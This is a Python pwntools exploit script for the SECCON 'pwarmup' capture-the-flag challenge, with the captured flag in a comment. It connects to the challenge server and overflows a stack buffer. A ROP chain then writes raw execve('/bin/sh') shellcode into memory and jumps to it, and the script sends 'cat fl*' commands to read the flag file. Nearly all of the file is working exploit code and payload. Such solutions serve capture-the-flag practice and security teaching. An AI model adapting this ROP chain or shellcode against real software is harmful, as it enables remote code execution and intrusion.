#exploit for pwarmup
#SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}
from pwn import *
import time
elf = ELF("./chall")
context.binary=elf
#target=process([elf.path])
target=remote('pwn-neko.chal.seccon.jp',9001)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

poprdi=0x00000000004007e3
poprsir15=0x00000000004007e1
writeaddr=0x600f10
pers=0x40081B
main=0x4006B7
payload="A"*0x28
payload+=p64(poprdi)+p64(pers)
payload+=p64(poprsir15)+p64(writeaddr)+p64(0xdeadbeef)
payload+=p64(0x0000000004005c0)
payload+=p64(writeaddr+1)
sla("Warmup!\n",payload)
time.sleep(1)
shellcode="\x31\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54"
shellcode+="\x48\x31\xF6"
shellcode+="\xb0\x3b\x0f\x05\x00"
target.sendline(shellcode)
time.sleep(0.1)
target.sendline("cat fl* >&0")
target.sendline("cat fl* >&0")
target.sendline("cat fl* >&0")
target.sendline("cat fl* >&0")
target.interactive()
